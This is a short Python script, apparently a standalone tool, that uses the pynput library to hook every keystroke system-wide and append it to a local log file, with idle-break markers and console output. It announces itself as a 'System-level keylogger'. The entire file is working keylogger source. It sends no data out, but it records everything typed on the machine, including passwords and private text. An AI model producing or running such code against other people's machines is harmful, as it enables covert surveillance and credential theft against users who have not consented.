import time
from pynput import keyboard

# File where captured system logs are saved
LOG_FILE = 'system_keystrokes.txt'

# Track the timestamp of the last keystroke for the 5-second idle rule
last_press_time = time.time()


def on_press(key):
  global last_press_time
  current_time = time.time()

  # Check if the user has been idle for 5 seconds or more
  if current_time - last_press_time > 5.0:
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
      f.write('\n\n--- [ 5s Idle Break / New Thought ] ---\n\n')

  last_press_time = current_time

  # Format special keys versus standard alphanumeric characters
  try:
    char = key.char
    if char is None:
      char = f'[{key.name}]'
  except AttributeError:
    if key == keyboard.Key.space:
      char = ' '
    elif key == keyboard.Key.enter:
      char = '\n'
    elif key == keyboard.Key.backspace:
      char = ' [BACKSPACE] '
    elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
      return  # Ignore modifier-only presses for clean logs
    else:
      char = f'[{key.name}]'

  # Write the character to the local log file
  with open(LOG_FILE, 'a', encoding='utf-8') as f:
    f.write(char)

  print(f'[+] Captured key: {repr(char)}')


if __name__ == '__main__':
  print(
      '[*] System-level keylogger active. Running in background (OS-wide'
      ' hook)...'
  )
  # Start the global system listener
  with keyboard.Listener(on_press=on_press) as listener:
    listener.join()